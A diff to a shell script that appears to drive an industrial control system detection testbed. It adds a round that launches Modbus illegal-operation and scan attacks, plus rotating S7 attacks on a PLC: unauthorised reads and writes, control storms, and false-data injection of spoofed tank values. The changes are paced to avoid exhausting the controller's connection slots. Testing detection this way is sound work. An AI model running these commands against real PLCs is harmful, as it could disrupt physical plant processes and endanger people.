@@ -9,8 +9,37 @@ mttm_header
 ROUNDS="${ROUNDS:-1}"
 GAP="${GAP:-4}"   # > COOLDOWN(3s) so back-to-back trials are not dedup-suppressed
 
+# ---------------------------------------------------------------------------
+# PLC-aware round (PLC_AWARE=1): built for the CPU 1212C's hard limit of 6 dynamic
+# connection resources. Every attack that opens an S7 session to PLC1 consumes one of
+# those 6 slots and, once isolated, leaves a dead session until the CPU reaps it - so
+# we fire at most ONE PLC1 S7 attack per cycle (rotated across vectors), only when the
+# tank is confirmed live, and let it reap before the next. All the attacks that do NOT
+# touch PLC1's pool - Modbus to the separate unit (.20), and the API-driven tier/GUARD/
+# auth probes in night_coverage.sh - keep running at full volume. This yields a rich,
+# sustained overnight without ever exhausting the 6 slots and evicting Factory IO.
+run_round_plcaware(){
+  # (a) pool-free attacks every cycle: forbidden Modbus op + enumeration on the LOW unit
+  MEAS_TGT="$MODBUS" MEAS_LEAK=0 measure_attack modbus_illegal "$IP_OP" "$NS_OP" \
+    sudo ip netns exec "$NS_OP" python3 "$MBATK" --host "$MODBUS" --attack illegal --count 3; sleep "$GAP"
+  MEAS_TGT="$MODBUS" MEAS_LEAK=0 measure_attack modbus_scan "$IP_OP" "$NS_OP" \
+    sudo ip netns exec "$NS_OP" python3 "$MBATK" --host "$MODBUS" --attack scan; sleep "$GAP"
+  # (b) at most ONE PLC1 S7 attack this cycle, and only if the tank is live (protect the 6 slots)
+  if tank_frozen; then log "  PLC-aware: tank not live - skipping the PLC1 S7 attack this cycle"; return; fi
+  case $(( ${CYCLE:-1} % 5 )) in
+    0) measure_attack recon_connect "$IP_ATK" "$NS_ATK" sudo ip netns exec "$NS_ATK" python3 "$S7" --host "$PLC1" --read --count 1 ;;
+    1) measure_attack unauth_write  "$IP_ATK" "$NS_ATK" sudo ip netns exec "$NS_ATK" python3 "$S7" --host "$PLC1" --val 0x08 --count 3 ;;
+    2) measure_attack unauth_control "$IP_ATK" "$NS_ATK" sudo ip netns exec "$NS_ATK" python3 "$S7" --host "$PLC1" --storm --secs 2 --hz 6 ;;
+    3) measure_attack fdi_scada "$IP_OP" "$NS_OP" sudo ip netns exec "$NS_OP" python3 "$S7" --host "$PLC1" --dbspoof --db 7 --offset 0 --spoofval 20 --secs 2 --hz 12 ;;
+    4) measure_attack fdi_high  "$IP_OP" "$NS_OP" sudo ip netns exec "$NS_OP" python3 "$S7" --host "$PLC1" --dbspoof --db 7 --offset 0 --spoofval 90 --secs 2 --hz 12 ;;
+  esac
+  # let the CPU reap the single dead session before the next cycle opens another
+  sleep "${PLC_DRAIN:-25}"
+}
+
 # each vector: a realistic production OT attack, launched from a namespace, then measured.
 run_round(){
+  if [ "${PLC_AWARE:-0}" = 1 ]; then run_round_plcaware; return; fi
   # 1) reconnaissance / unauthorised connect from an unregistered host
   measure_attack recon_connect "$IP_ATK" "$NS_ATK" \
     sudo ip netns exec "$NS_ATK" python3 "$S7" --host "$PLC1" --read --count 1; sleep "$GAP"
